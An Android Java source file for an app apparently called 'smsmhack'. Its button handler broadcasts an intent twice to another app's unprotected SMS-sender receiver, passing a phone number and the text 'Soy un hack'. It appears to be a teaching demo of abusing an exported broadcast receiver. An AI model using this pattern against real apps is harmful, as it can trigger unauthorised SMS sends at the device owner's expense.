package com.eguic.smsmhack;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.support.annotation.RequiresApi;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    public void enviar(View view){
        for(int i = 0; i < 2; i++){
            Intent intent = new Intent("com.eguic.smssender.ActionReceiver");
            intent.putExtra("numero","87022315");
            intent.putExtra("mensaje","Soy un hack");
            getApplicationContext().sendBroadcast(intent);
        }
        Context context = getApplicationContext();
        CharSequence text = "Mensaje enviado";
        int duration = Toast.LENGTH_SHORT;

        Toast toast = Toast.makeText(context, text, duration);
        toast.show();
    }
}
